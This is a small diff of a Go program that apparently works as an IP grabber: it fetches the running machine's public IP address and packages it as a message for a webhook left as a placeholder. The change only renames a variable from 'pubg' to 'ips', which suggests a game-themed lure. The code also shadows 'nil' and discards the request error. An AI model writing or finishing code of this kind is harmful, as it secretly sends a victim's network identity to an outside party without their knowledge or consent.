@@ -9,8 +9,8 @@ import (
 
 func main() {
 	urls := "Enter Webhook Here"
-	pubg, nil := http.Get("https://api.myip.com")
-	body, err := ioutil.ReadAll(pubg.Body)
+	ips, nil := http.Get("https://api.myip.com")
+	body, err := ioutil.ReadAll(ips.Body)
 	ip := string(body)
 	datas := url.Values{
 		"content": {"There Ip Address:" + ip},
